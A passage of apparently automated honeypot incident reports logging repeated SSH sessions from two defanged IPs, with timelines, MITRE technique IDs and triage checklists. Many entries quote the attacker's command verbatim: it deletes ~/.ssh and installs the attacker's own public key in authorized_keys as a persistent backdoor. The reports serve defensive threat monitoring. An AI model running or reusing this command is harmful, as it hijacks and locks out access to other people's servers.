| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:47:54` | `cowrie.session.connect` |
| `2026-04-14 15:47:54` | `cowrie.client.version` |
| `2026-04-14 15:47:54` | `cowrie.client.kex` |
| `2026-04-14 15:47:55` | `cowrie.login.success` |
| `2026-04-14 15:47:55` | `cowrie.session.params` |
| `2026-04-14 15:47:55` | `cowrie.command.input` |
| `2026-04-14 15:47:55` | `cowrie.command.failed` |
| `2026-04-14 15:47:55` | `cowrie.log.closed` |
| `2026-04-14 15:47:56` | `cowrie.session.params` |
| `2026-04-14 15:47:56` | `cowrie.command.input` |
| `2026-04-14 15:47:56` | `cowrie.session.file_download` |
| `2026-04-14 15:47:56` | `cowrie.log.closed` |
| `2026-04-14 15:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b36eafdae3d0

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:47 |
| **Last Seen** | 2026-04-14 15:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:47:58` | `cowrie.session.connect` |
| `2026-04-14 15:47:58` | `cowrie.client.version` |
| `2026-04-14 15:47:58` | `cowrie.client.kex` |
| `2026-04-14 15:47:58` | `cowrie.login.success` |
| `2026-04-14 15:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-addde2cedbaf

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:48 |
| **Last Seen** | 2026-04-14 15:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:48:26` | `cowrie.session.connect` |
| `2026-04-14 15:48:26` | `cowrie.client.version` |
| `2026-04-14 15:48:26` | `cowrie.client.kex` |
| `2026-04-14 15:48:26` | `cowrie.login.success` |
| `2026-04-14 15:48:27` | `cowrie.session.params` |
| `2026-04-14 15:48:27` | `cowrie.command.input` |
| `2026-04-14 15:48:27` | `cowrie.command.failed` |
| `2026-04-14 15:48:27` | `cowrie.log.closed` |
| `2026-04-14 15:48:27` | `cowrie.session.params` |
| `2026-04-14 15:48:27` | `cowrie.command.input` |
| `2026-04-14 15:48:27` | `cowrie.session.file_download` |
| `2026-04-14 15:48:27` | `cowrie.log.closed` |
| `2026-04-14 15:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48ca58978a71

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:48 |
| **Last Seen** | 2026-04-14 15:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:48:29` | `cowrie.session.connect` |
| `2026-04-14 15:48:29` | `cowrie.client.version` |
| `2026-04-14 15:48:30` | `cowrie.client.kex` |
| `2026-04-14 15:48:30` | `cowrie.login.success` |
| `2026-04-14 15:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db84a80ae715

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:48 |
| **Last Seen** | 2026-04-14 15:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:48:42` | `cowrie.session.connect` |
| `2026-04-14 15:48:42` | `cowrie.client.version` |
| `2026-04-14 15:48:42` | `cowrie.client.kex` |
| `2026-04-14 15:48:43` | `cowrie.login.success` |
| `2026-04-14 15:48:43` | `cowrie.session.params` |
| `2026-04-14 15:48:43` | `cowrie.command.input` |
| `2026-04-14 15:48:43` | `cowrie.command.failed` |
| `2026-04-14 15:48:43` | `cowrie.log.closed` |
| `2026-04-14 15:48:44` | `cowrie.session.params` |
| `2026-04-14 15:48:44` | `cowrie.command.input` |
| `2026-04-14 15:48:44` | `cowrie.session.file_download` |
| `2026-04-14 15:48:44` | `cowrie.log.closed` |
| `2026-04-14 15:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9e8a5b9edb7

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:48 |
| **Last Seen** | 2026-04-14 15:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:48:46` | `cowrie.session.connect` |
| `2026-04-14 15:48:46` | `cowrie.client.version` |
| `2026-04-14 15:48:46` | `cowrie.client.kex` |
| `2026-04-14 15:48:47` | `cowrie.login.success` |
| `2026-04-14 15:48:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f5cbe5af0ed

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:49 |
| **Last Seen** | 2026-04-14 15:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:49:13` | `cowrie.session.connect` |
| `2026-04-14 15:49:13` | `cowrie.client.version` |
| `2026-04-14 15:49:13` | `cowrie.client.kex` |
| `2026-04-14 15:49:13` | `cowrie.login.success` |
| `2026-04-14 15:49:14` | `cowrie.session.params` |
| `2026-04-14 15:49:14` | `cowrie.command.input` |
| `2026-04-14 15:49:14` | `cowrie.command.failed` |
| `2026-04-14 15:49:14` | `cowrie.log.closed` |
| `2026-04-14 15:49:14` | `cowrie.session.params` |
| `2026-04-14 15:49:14` | `cowrie.command.input` |
| `2026-04-14 15:49:14` | `cowrie.session.file_download` |
| `2026-04-14 15:49:14` | `cowrie.log.closed` |
| `2026-04-14 15:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88288e0ca943

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:49 |
| **Last Seen** | 2026-04-14 15:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:49:16` | `cowrie.session.connect` |
| `2026-04-14 15:49:16` | `cowrie.client.version` |
| `2026-04-14 15:49:16` | `cowrie.client.kex` |
| `2026-04-14 15:49:17` | `cowrie.login.success` |
| `2026-04-14 15:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8037a09a9a0b

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:49 |
| **Last Seen** | 2026-04-14 15:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:49:31` | `cowrie.session.connect` |
| `2026-04-14 15:49:31` | `cowrie.client.version` |
| `2026-04-14 15:49:32` | `cowrie.client.kex` |
| `2026-04-14 15:49:32` | `cowrie.login.success` |
| `2026-04-14 15:49:33` | `cowrie.session.params` |
| `2026-04-14 15:49:33` | `cowrie.command.input` |
| `2026-04-14 15:49:33` | `cowrie.command.failed` |
| `2026-04-14 15:49:33` | `cowrie.log.closed` |
| `2026-04-14 15:49:33` | `cowrie.session.params` |
| `2026-04-14 15:49:33` | `cowrie.command.input` |
| `2026-04-14 15:49:33` | `cowrie.session.file_download` |
| `2026-04-14 15:49:33` | `cowrie.log.closed` |
| `2026-04-14 15:49:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3cc2f4a4f52b

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:49 |
| **Last Seen** | 2026-04-14 15:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:49:35` | `cowrie.session.connect` |
| `2026-04-14 15:49:35` | `cowrie.client.version` |
| `2026-04-14 15:49:35` | `cowrie.client.kex` |
| `2026-04-14 15:49:36` | `cowrie.login.success` |
| `2026-04-14 15:49:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fad22abe6a9e

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:49 |
| **Last Seen** | 2026-04-14 15:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:49:48` | `cowrie.session.connect` |
| `2026-04-14 15:49:48` | `cowrie.client.version` |
| `2026-04-14 15:49:48` | `cowrie.client.kex` |
| `2026-04-14 15:49:48` | `cowrie.login.success` |
| `2026-04-14 15:49:49` | `cowrie.session.params` |
| `2026-04-14 15:49:49` | `cowrie.command.input` |
| `2026-04-14 15:49:49` | `cowrie.command.failed` |
| `2026-04-14 15:49:49` | `cowrie.log.closed` |
| `2026-04-14 15:49:49` | `cowrie.session.params` |
| `2026-04-14 15:49:49` | `cowrie.command.input` |
| `2026-04-14 15:49:49` | `cowrie.session.file_download` |
| `2026-04-14 15:49:49` | `cowrie.log.closed` |
| `2026-04-14 15:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f64f0053e33

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:49 |
| **Last Seen** | 2026-04-14 15:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:49:51` | `cowrie.session.connect` |
| `2026-04-14 15:49:51` | `cowrie.client.version` |
| `2026-04-14 15:49:52` | `cowrie.client.kex` |
| `2026-04-14 15:49:52` | `cowrie.login.success` |
| `2026-04-14 15:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca33536837a0

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:50 |
| **Last Seen** | 2026-04-14 15:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:50:03` | `cowrie.session.connect` |
| `2026-04-14 15:50:03` | `cowrie.client.version` |
| `2026-04-14 15:50:03` | `cowrie.client.kex` |
| `2026-04-14 15:50:04` | `cowrie.login.success` |
| `2026-04-14 15:50:04` | `cowrie.session.params` |
| `2026-04-14 15:50:04` | `cowrie.command.input` |
| `2026-04-14 15:50:04` | `cowrie.command.failed` |
| `2026-04-14 15:50:04` | `cowrie.log.closed` |
| `2026-04-14 15:50:05` | `cowrie.session.params` |
| `2026-04-14 15:50:05` | `cowrie.command.input` |
| `2026-04-14 15:50:05` | `cowrie.session.file_download` |
| `2026-04-14 15:50:05` | `cowrie.log.closed` |
| `2026-04-14 15:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9d31ae9a821

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:50 |
| **Last Seen** | 2026-04-14 15:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:50:07` | `cowrie.session.connect` |
| `2026-04-14 15:50:07` | `cowrie.client.version` |
| `2026-04-14 15:50:07` | `cowrie.client.kex` |
| `2026-04-14 15:50:08` | `cowrie.login.success` |
| `2026-04-14 15:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.16.214[.]226` to AbuseIPDB if not already reported
- [ ] Block `185.16.214[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74731123976b

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:50 |
| **Last Seen** | 2026-04-14 15:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:50:21` | `cowrie.session.connect` |
| `2026-04-14 15:50:21` | `cowrie.client.version` |
| `2026-04-14 15:50:21` | `cowrie.client.kex` |
| `2026-04-14 15:50:21` | `cowrie.login.success` |
| `2026-04-14 15:50:22` | `cowrie.session.params` |
| `2026-04-14 15:50:22` | `cowrie.command.input` |
| `2026-04-14 15:50:22` | `cowrie.command.failed` |
| `2026-04-14 15:50:22` | `cowrie.log.closed` |
| `2026-04-14 15:50:22` | `cowrie.session.params` |
| `2026-04-14 15:50:22` | `cowrie.command.input` |
| `2026-04-14 15:50:22` | `cowrie.session.file_download` |
| `2026-04-14 15:50:22` | `cowrie.log.closed` |
| `2026-04-14 15:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b33bc64a441

| Field | Detail |
|---|---|
| **Source IP** | `49.64.169[.]153` |
| **First Seen** | 2026-04-14 15:50 |
| **Last Seen** | 2026-04-14 15:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:50:24` | `cowrie.session.connect` |
| `2026-04-14 15:50:24` | `cowrie.client.version` |
| `2026-04-14 15:50:24` | `cowrie.client.kex` |
| `2026-04-14 15:50:25` | `cowrie.login.success` |
| `2026-04-14 15:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.64.169[.]153` to AbuseIPDB if not already reported
- [ ] Block `49.64.169[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-784511929a93

| Field | Detail |
|---|---|
| **Source IP** | `185.16.214[.]226` |
| **First Seen** | 2026-04-14 15:50 |
| **Last Seen** | 2026-04-14 15:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 15:50:37` | `cowrie.session.connect` |
| `2026-04-14 15:50:37` | `cowrie.client.version` |
| `2026-04-14 15:50:37` | `cowrie.client.kex` |
| `2026-04-14 15:50:38` | `cowrie.login.success` |
| `2026-04-14 15:50:38` | `cowrie.session.params` |
| `2026-04-14 15:50:38` | `cowrie.command.input` |
